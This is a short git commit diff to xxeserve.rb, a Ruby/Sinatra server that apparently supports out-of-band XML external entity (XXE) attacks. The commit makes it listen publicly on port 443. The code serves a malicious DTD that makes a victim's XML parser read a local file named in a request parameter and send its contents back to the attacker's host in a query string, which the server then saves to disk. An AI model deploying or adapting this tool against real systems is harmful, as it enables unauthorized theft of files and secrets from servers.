ab5b7c0294e3a619fe523c4d99972a80b6e68f5b
Alex Lauerman <alex.lauerman@gmail.com>
2015-03-21 08:54:07 -0500

    Listener customization
    Added port customization port and ability to listen (not just on localhost)

--- xxeserve.rb
+++ xxeserve.rb
@@ -2,6 +2,9 @@
 
 require 'sinatra'
 
+set :port, 443 #set listening port here
+set :bind, '0.0.0.0' #so are aren't just listening locally
+
 get "/" do
   return "OHAI" if params[:p].nil?
   f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
@@ -14,7 +17,7 @@ get "/xml" do
   return "" if params[:f].nil?
 
 <<END  
-<!ENTITY % payl SYSTEM "file://#{params[:f]}">
+<!ENTITY % payl SYSTEM 'file://#{params[:f]}'>
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://#{request.host}:#{request.port}/?p=%payl;'>">
 END
 end
